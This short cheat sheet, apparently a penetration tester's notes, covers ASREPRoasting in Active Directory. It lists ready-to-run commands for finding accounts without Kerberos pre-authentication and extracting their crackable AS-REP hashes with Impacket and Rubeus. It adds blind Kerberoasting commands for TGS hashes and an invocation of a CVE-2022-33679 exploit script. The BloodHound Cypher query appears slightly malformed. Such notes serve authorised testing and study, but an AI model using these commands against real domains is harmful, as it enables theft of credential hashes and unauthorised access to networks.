# ASREPRoast

## Tools: Rubeus , Impacket-GetNPUsers

### ASREPRoast

## Find ASREPRoastable users (need creds)

 - Get-DomainUser -PreauthNotRequired -Properties SamAccountName

 - MATCH(u:User {dontreqpreauth:true}). (c:Computer). p=shortestPath((u)-[*1..]->(c)) RETURN p (Bloodhound cypher query)

## Find ASREP hash

 - Impacket-GetNPUsers DOMAIN/ -usersfile USERNAMES.TXT -format hashcat -outputfile HASHES.DOMAIN.TXT

 - Rubeus.exe asreproast /format:hashcat

## Find TGS Hash

 - Impacket-GetUserSPNs -no-preauth "ASREP_USER" -usersfile "USER_LIST.TXT" -dc-host "DC_IP" "DOMAIN"/ (Blind Kerberoasting)

 - Rubeus.exe kerberoast /domain:DOMAIN /dc:DC_IP /nopreauth: ASREP_USER /spns:USERS.TXT (Blind Kerberoasting)

## Lateral Movement (PTT)

 - python3 CVE-2022-33679.py DOMAIN/USER TARGET
